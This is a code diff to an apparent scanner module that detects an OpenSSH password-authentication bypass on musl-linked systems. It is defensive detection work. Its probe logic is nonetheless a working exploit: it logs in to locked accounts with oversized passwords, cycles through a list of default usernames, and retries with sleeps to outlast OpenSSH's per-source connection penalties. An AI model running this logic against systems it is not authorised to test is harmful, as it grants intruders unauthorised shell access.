@@ -23,6 +23,7 @@ import (
 	"errors"
 	"fmt"
 	"strings"
+	"time"
 
 	"github.com/google/goonami-scanner/common/clients/sshclient"
 	"github.com/google/goonami-scanner/core/config"
@@ -42,25 +43,47 @@ import (
 const (
 	moduleName = "dt/opensshauthbypass"
 
-	// targetUser is the default account with '*' in /etc/shadow on Alpine Linux.
-	targetUser = "root"
-
-	// probePasswordLen is between musl's SHA-256/SHA-512 KEY_MAX (256) and
-	// OpenSSH's MAX_PASSWORD_LEN (1024), triggering musl crypt() to fail and
-	// return "*".
-	probePasswordLen = 512
+	// probePasswordLen is strictly greater than musl libc's SHA-256/SHA-512
+	// KEY_MAX (256) and within OpenSSH's MAX_PASSWORD_LEN (1024), causing musl
+	// crypt() to fail and return "*" (matching locked "*" shadow entries).
+	probePasswordLen = 300
 
 	// shortProbePassword is <= 256 bytes so musl crypt() hashes it normally
 	// instead of returning "*".
 	shortProbePassword = "goonami-invalid-short-probe"
+
+	// maxPenaltyCooldownRetries bounds cumulative pre-banner drop retries per
+	// service when OpenSSH 9.8+ PerSourcePenalties temporarily drops new TCP
+	// connections following port scanning or failed authentication handshakes.
+	maxPenaltyCooldownRetries = 10
+
+	// penaltyCooldownSleep is the backoff interval between pre-banner drop
+	// retries, allowing OpenSSH 9.8+ PerSourcePenalties (default min:15s) to
+	// expire within maxPenaltyCooldownRetries * penaltyCooldownSleep (30s).
+	penaltyCooldownSleep = 3 * time.Second
+
+	openSSHBannerPrefix = "SSH-2.0-OpenSSH"
 )
+
+// candidateUsernames lists default root and non-root accounts on Alpine Linux,
+// OpenWrt, Buildroot, Yocto, and container images that commonly carry "*" in
+// /etc/shadow while PermitRootLogin may be disabled.
+var candidateUsernames = []string{
+	"root",
+	"alpine",
+	"sshuser",
+	"admin",
+	"user",
+	"guest",
+}
 
 // Module implements the module.VulnDetector interface for OpenSSH musl password
 // authentication bypass detection.
 type Module struct {
 	*module.BaseModule
-	config *config.Config
-	client *sshclient.Client
+	config  *config.Config
+	client  *sshclient.Client
+	sleepFn func(context.Context, time.Duration) error
 }
 
 func init() {
@@ -73,6 +96,7 @@ func New(ctx context.Context, cfg *config.Config) (module.VulnDetector, error) {
 		BaseModule: module.NewBaseModule(moduleName),
 		config:     cfg,
 		client:     sshclient.New(cfg),
+		sleepFn:    sshclient.SleepContext,
 	}, nil
 }
 
@@ -95,8 +119,8 @@ func baseVulnerability() *vpb.Vulnerability {
 		},
 		Severity:       vpb.Severity_CRITICAL,
 		Title:          "OpenSSH Password Authentication Bypass on musl-based Systems",
-		Description:    "The OpenSSH server is vulnerable to a password authentication bypass when linked against musl libc. When authenticating an account whose shadow password field is '*' (such as the default root entry on Alpine Linux) and at least one other account on the system has a modular crypt password hash (such as SHA-512), supplying a password longer than 256 bytes causes musl's crypt() implementation to fail and return '*', matching the locked shadow entry and granting unauthorized access.",
-		Recommendation: "Upgrade OpenSSH to a patched version (such as openssh 9.9_p2-r1 or later on Alpine Linux), or disable password authentication (PasswordAuthentication no) in sshd_config.",
+		Description:    "The OpenSSH server is vulnerable to a password authentication bypass when linked against musl libc. When authenticating an account whose shadow password field is '*' (such as default root or service accounts on Alpine Linux, OpenWrt, Buildroot, or Yocto) and at least one account on the system has a modular crypt password hash (such as SHA-512), supplying a password longer than 256 bytes causes musl's crypt() implementation to fail and return '*', matching the locked shadow entry and granting unauthorized access.",
+		Recommendation: "Upgrade OpenSSH to a patched version (OpenSSH 10.6p2 or later upstream, or distro backports such as openssh 9.9_p2-r1 or later on Alpine Linux) and restart sshd, or disable password authentication (PasswordAuthentication no) in sshd_config.",
 	}.Build()
 }
 
@@ -121,7 +145,7 @@ func (m *Module) Detect(ctx context.Context, service *nspb.NetworkService) (*dpb
 		return nil, err
 	}
 
-	vulnerable, err := m.isVulnerable(ctx, addr)
+	verifiedUser, vulnerable, err := m.verifyService(ctx, addr)
 	if err != nil {
 		return nil, err
 	}
@@ -129,80 +153,136 @@ func (m *Module) Detect(ctx context.Context, service *nspb.NetworkService) (*dpb
 		return nil, nil
 	}
 
-	return buildDetectionReport(service), nil
+	return buildDetectionReport(service, verifiedUser), nil
 }
 
 type authResult int
 
 const (
-	authNotSSHOrUnsupported authResult = iota
+	authAbortService authResult = iota
 	authRejected
 	authAccepted
 )
 
-func (m *Module) isVulnerable(ctx context.Context, addr string) (bool, error) {
-	// 1. Probe with a >256-byte password ("AAA..."). On vulnerable OpenSSH + musl
-	// targets where /etc/shadow has '*' for root and a modular crypt salt from
-	// another account, musl crypt() fails on >256 bytes and returns "*".
-	res, err := m.tryPassword(ctx, addr, targetUser, strings.Repeat("A", probePasswordLen))
-	if err != nil || res != authAccepted {
-		return false, err
-	}
-
-	// 2. Verify with a second distinct >256-byte password ("BBB...") to rule out
-	// the first probe coincidentally matching an actual password.
-	res, err = m.tryPassword(ctx, addr, targetUser, strings.Repeat("B", probePasswordLen))
-	if err != nil || res != authAccepted {
-		return false, err
-	}
-
-	// 3. Negative validation: verify that a <=256-byte invalid password is
-	// explicitly rejected to rule out honeypots, accept-all servers, or dropped
-	// connections.
-	res, err = m.tryPassword(ctx, addr, targetUser, shortProbePassword)
-	if err != nil {
-		return false, err
-	}
-	if res == authAccepted {
-		log.DebugContextf(ctx, log.DebugLevelService, "target accepted short invalid password; skipping accept-all service")
-		return false, nil
-	}
-	if res != authRejected {
-		return false, nil
-	}
-
-	return true, nil
+type serviceProbeState struct {
+	addr                    string
+	remainingPenaltyRetries int
 }
 
-func (m *Module) tryPassword(ctx context.Context, addr, username, password string) (authResult, error) {
-	// We supply the password twice within the same SSH connection because on
-	// OpenSSH + musl systems using /etc/shadow, the first password attempt in a
-	// connection initializes pick_salt()'s static salt buffer (clobbering
-	// getspnam()'s static line buffer), while the second attempt in the same
-	// connection reuses the cached salt without calling getspnam(), preserving
-	// pw_password ("*") for strcmp("*", "*").
-	conn, err := m.client.ConnectWithPasswords(ctx, addr, username, password, password)
-	if err != nil {
+func (m *Module) verifyService(ctx context.Context, addr string) (string, bool, error) {
+	state := &serviceProbeState{
+		addr:                    addr,
+		remainingPenaltyRetries: maxPenaltyCooldownRetries,
+	}
+
+	firstLongPassword := strings.Repeat("A", probePasswordLen)
+	secondLongPassword := strings.Repeat("B", probePasswordLen)
+
+	for _, username := range candidateUsernames {
+		if err := ctx.Err(); err != nil {
+			return "", false, err
+		}
+
+		// 1. Probe with a >256-byte password ("AAA..."). On vulnerable OpenSSH + musl
+		// targets where /etc/shadow has '*' for username and a modular crypt salt on
+		// the system, musl crypt() fails on >256 bytes and returns "*".
+		res, err := m.tryPasswordWithRetry(ctx, state, username, firstLongPassword)
+		if err != nil {
+			return "", false, err
+		}
+		if res == authAbortService {
+			return "", false, nil
+		}
+		if res != authAccepted {
+			continue
+		}
+
+		// 2. Verify with a second distinct >256-byte password ("BBB...") to rule out
+		// the first probe coincidentally matching an actual password.
+		res, err = m.tryPasswordWithRetry(ctx, state, username, secondLongPassword)
+		if err != nil {
+			return "", false, err
+		}
+		if res == authAbortService {
+			return "", false, nil
+		}
+		if res != authAccepted {
+			continue
+		}
+
+		// 3. Negative validation: verify that a <=256-byte invalid password is
+		// explicitly rejected to rule out honeypots or accept-all SSH servers.
+		res, err = m.tryPasswordWithRetry(ctx, state, username, shortProbePassword)
+		if err != nil {
+			return "", false, err
+		}
+		if res == authAccepted {
+			log.DebugContextf(ctx, log.DebugLevelService, "target accepted short invalid password for %q; continuing to next candidate account", username)
+			continue
+		}
+		if res == authRejected {
+			return username, true, nil
+		}
+		return "", false, nil
+	}
+
+	return "", false, nil
+}
+
+func (m *Module) tryPasswordWithRetry(ctx context.Context, state *serviceProbeState, username, password string) (authResult, error) {
+	for {
+		// We supply the password twice within the same SSH connection because on
+		// OpenSSH + musl systems using /etc/shadow, the first password attempt in a
+		// connection initializes pick_salt()'s static salt buffer (clobbering
+		// getspnam()'s static line buffer), while the second attempt in the same
+		// connection reuses the cached salt without calling getspnam(), preserving
+		// pw_passwd ("*") for strcmp("*", "*").
+		conn, serverVersion, err := m.client.ConnectAndReturnServerVersion(ctx, state.addr, username, password, password)
+		if serverVersion != "" && !strings.HasPrefix(serverVersion, openSSHBannerPrefix) {
+			if conn != nil {
+				_ = conn.Close()
+			}
+			log.DebugContextf(ctx, log.DebugLevelService, "skipping non-OpenSSH banner %q on %q", serverVersion, state.addr)
+			return authAbortService, nil
+		}
+
+		if err == nil {
+			_ = conn.Close()
+			return authAccepted, nil
+		}
 		if ctxErr := ctx.Err(); ctxErr != nil {
-			return authNotSSHOrUnsupported, ctxErr
+			return authAbortService, ctxErr
+		}
+		if errors.Is(err, sshclient.ErrPasswordAuthUnsupported) {
+			log.DebugContextf(ctx, log.DebugLevelService, "password authentication unsupported on %q; stopping scan", state.addr)
+			return authAbortService, nil
 		}
 		if errors.Is(err, sshclient.ErrAuthFailed) {
 			return authRejected, nil
 		}
-		log.DebugContextf(ctx, log.DebugLevelService, "SSH probe to %q failed: %v", addr, err)
-		return authNotSSHOrUnsupported, nil
+		if errors.Is(err, sshclient.ErrConnectionDropped) &&
+			m.client.HasConfirmedSSH(state.addr) &&
+			state.remainingPenaltyRetries > 0 {
+			state.remainingPenaltyRetries--
+			log.DebugContextf(ctx, log.DebugLevelRequest, "connection dropped pre-banner on %q (%d cooldown retries left), sleeping %s", state.addr, state.remainingPenaltyRetries, penaltyCooldownSleep)
+			if sleepErr := m.sleepFn(ctx, penaltyCooldownSleep); sleepErr != nil {
+				return authAbortService, sleepErr
+			}
+			continue
+		}
+
+		log.DebugContextf(ctx, log.DebugLevelService, "SSH probe to %q failed: %v", state.addr, err)
+		return authAbortService, nil
 	}
-	_ = conn.Close()
-	return authAccepted, nil
 }
 
-func buildDetectionReport(service *nspb.NetworkService) *dpb.DetectionReportList {
+func buildDetectionReport(service *nspb.NetworkService, verifiedUsername string) *dpb.DetectionReportList {
 	vuln := baseVulnerability()
 	vuln.SetAdditionalDetails([]*vpb.AdditionalDetail{
 		vpb.AdditionalDetail_builder{
 			Description: "Authentication bypass verified for locked account using >256-byte password",
 			TextData: vpb.TextData_builder{
-				Text: fmt.Sprintf("Successfully authenticated as %q with distinct %d-byte passwords while rejecting <=256-byte passwords.", targetUser, probePasswordLen),
+				Text: fmt.Sprintf("Successfully authenticated as %q with distinct %d-byte passwords while rejecting <=256-byte passwords.", verifiedUsername, probePasswordLen),
 			}.Build(),
 		}.Build(),
 	})
